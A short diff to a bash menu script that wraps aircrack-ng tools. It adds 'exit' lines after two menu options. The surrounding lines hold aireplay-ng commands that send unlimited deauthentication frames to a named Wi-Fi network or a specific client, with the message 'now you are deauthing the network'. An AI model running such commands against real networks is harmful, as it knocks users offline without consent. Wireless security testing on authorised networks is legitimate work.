@@ -148,6 +148,7 @@ echo "now you are deauthing the network if you want to stop just close the windo
 xterm -e "aireplay-ng -0 0 -e '$name' $wire""mon; read" 
 
 
+exit
 
 			elif [ $menuSelection -eq 2 ]
 			then
@@ -204,7 +205,7 @@ gnome-terminal -x sh -c "airodump-ng --essid '$name' -c $channel $wire""mon"
 		echo -e "when you are done just close the window"
 		xterm -e "aireplay-ng -0 0 -e '$name' -c '$station' $wire""mon; read"
 
-
+exit
 			elif [ $menuSelection -eq 3 ]
 			then
 				drawClear
